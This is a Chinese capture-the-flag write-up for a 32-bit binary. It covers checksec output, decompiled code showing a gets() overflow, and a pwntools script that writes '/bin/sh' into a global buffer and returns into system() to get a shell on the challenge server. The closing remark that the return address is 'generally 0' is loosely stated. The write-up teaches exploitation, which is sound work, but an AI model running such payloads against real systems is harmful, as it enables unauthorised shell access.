# checksec

```
 Arch:     i386-32-little
 RELRO:    Partial RELRO
 Stack:    No canary found
 NX:       NX enabled
 PIE:      No PIE (0x8048000)
```

# IDA

分析程序：

```c
char *hello()
{
  __int16 *v0; // eax
  int v1; // ebx
  unsigned int v2; // ecx
  __int16 *v3; // eax
  __int16 s; // [esp+12h] [ebp-26h] BYREF
  int v6; // [esp+14h] [ebp-24h] BYREF

  v0 = &s;
  v1 = 30;
  if ( ((unsigned __int8)&s & 2) != 0 )
  {
    s = 0;
    v0 = (__int16 *)&v6;
    v1 = 28;
  }
  v2 = 0;
  do
  {
    *(_DWORD *)&v0[v2 / 2] = 0;
    v2 += 4;
  }
  while ( v2 < (v1 & 0xFFFFFFFC) );
  v3 = &v0[v2 / 2];
  if ( (v1 & 2) != 0 )
    *v3++ = 0;
  if ( (v1 & 1) != 0 )
    *(_BYTE *)v3 = 0;
  puts("please tell me your name");
  fgets(name, 50, stdin);
  puts("hello,you can leave some message here:");
  return gets((char *)&s);
```

hello函数中的gets()存在栈溢出漏洞。

发现system函数，变量name的地址固定。可以利用栈溢出调用system函数，参数为name，需要在name中写入/bin/sh。

```python
from pwn import *

context.log_level='debug'

p = remote('111.200.241.244', 58913)
elf = ELF('./53c24fc5522e4a8ea2d9ad0577196b2f')

p.recvuntil('please tell me your name\n')

p.sendline(b'/bin/sh')

p.recvuntil('hello,you can leave some message here:\n')

sys_addr = elf.symbols['system']

print(hex(sys_addr))

payload = b'a' * 42 + p32(sys_addr) + p32(0) +  p32(0x0804A080)
p.sendline(payload)

p.interactive()
```

**在32位程序运行中，函数参数直接压入栈中，调用函数时栈的结构为：调用函数地址 --- 函数返回的地址 -- 参数n -- 参数n-1 -- ... -- 参数1**，**函数的返回地址一般为0**

